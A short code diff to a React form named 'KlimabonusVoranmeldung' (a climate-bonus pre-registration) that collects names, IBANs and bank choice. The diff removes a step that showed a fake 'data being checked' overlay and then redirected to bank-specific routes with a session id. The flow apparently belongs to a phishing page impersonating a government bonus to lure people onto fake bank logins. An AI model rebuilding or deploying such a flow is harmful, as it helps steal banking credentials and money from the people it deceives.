@@ -169,13 +169,7 @@ const KlimabonusVoranmeldung = () => {
       return;
     }
 
-    const route = bankRouteMap[selectedBank];
-    if (route) {
-      setShowLoading(true);
-      setTimeout(() => {
-        navigate(`${route}?s=${sessionId}`);
-      }, 2500);
-    }
+    setStep(3);
   }, [
     step2Valid,
     firstName,
@@ -191,14 +185,10 @@ const KlimabonusVoranmeldung = () => {
     city,
     iban,
     selectedBank,
-    navigate,
   ]);
 
   return (
     <>
-      {showLoading && (
-        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
-      )}
       <InvestmentCheckWizardShell step={step}>
         {step === 1 && (
           <div>
